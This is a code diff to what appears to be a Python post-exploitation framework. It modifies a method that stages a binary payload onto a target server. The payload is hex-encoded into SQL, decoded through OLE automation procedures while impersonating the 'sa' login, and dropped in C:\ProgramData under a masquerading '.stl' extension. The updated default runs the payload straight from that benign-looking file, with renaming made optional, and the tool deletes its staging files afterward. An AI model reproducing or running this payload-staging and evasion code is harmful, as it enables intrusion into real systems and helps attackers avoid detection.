@@ -28,12 +28,14 @@ class StagingMixin:
         self._exec_q(shell, "EXECUTE AS LOGIN='sa';IF OBJECT_ID('tempdb..stg','U') IS NOT NULL DROP TABLE tempdb..stg;")
         print(f"[+] xpstage done: {out_path}")
 
-    def cmd_xpstage_hex(self, shell, payload_name: str, timeout_s: int = 120):
+    def cmd_xpstage_hex(self, shell, payload_name: str, timeout_s: int = 120, rename: bool = False):
         """Stage binary to IIS01 via hex SQL + T-SQL ADODB.Stream decode (no .ps1).
 
-        Two-phase masquerade: the hex INSERT SQL lands on WS01 as .stl, and the
-        decode batch writes the binary to C:\\ProgramData as .stl before renaming
-        it to the original name via sp_OA FSO MoveFile in the same batch.
+        Default: the decode batch writes the binary to C:\\ProgramData as
+        <stem>.stl and leaves it under the masquerading extension - the payload
+        is executed directly from the benign-extension file. With rename=True,
+        a sp_OA FSO MoveFile in the same decode batch renames it back to the
+        original payload_name before use.
         """
         resp = shell._post_json("/api/v1.0/mssql/stage", {
             "handler": "toneshell",
@@ -64,17 +66,21 @@ class StagingMixin:
             f"'{self._tsql_escape(stl_path)}',2;"
             "EXEC sp_OAMethod @obj,'Close';"
             "EXEC sp_OADestroy @obj;"
-            "EXEC @hr=sp_OACreate 'Scripting.FileSystemObject',@obj OUT;"
-            f"EXEC sp_OAMethod @obj,'MoveFile',NULL,"
-            f"'{self._tsql_escape(stl_path)}','{self._tsql_escape(out_path)}';"
-            "EXEC sp_OADestroy @obj;"
         )
+        if rename:
+            decode_tsql += (
+                "EXEC @hr=sp_OACreate 'Scripting.FileSystemObject',@obj OUT;"
+                f"EXEC sp_OAMethod @obj,'MoveFile',NULL,"
+                f"'{self._tsql_escape(stl_path)}','{self._tsql_escape(out_path)}';"
+                "EXEC sp_OADestroy @obj;"
+            )
         self._exec_q(shell, decode_tsql, timeout_s=timeout_s)
 
         shell.cmd_exec_raw(f'cmd /c del /f {remote_sql}')
         self._exec_q(shell, "EXECUTE AS LOGIN='sa';"
             "IF OBJECT_ID('tempdb..stg','U') IS NOT NULL DROP TABLE tempdb..stg;")
-        print(f"[+] xpstage-hex done: {out_path}")
+        final_path = out_path if rename else stl_path
+        print(f"[+] xpstage-hex done: {final_path}")
 
     def _build_decrypt_ps(self, key_b64: str, out_path: str) -> str:
         sqlclient_host = self._host.replace(':', ',')
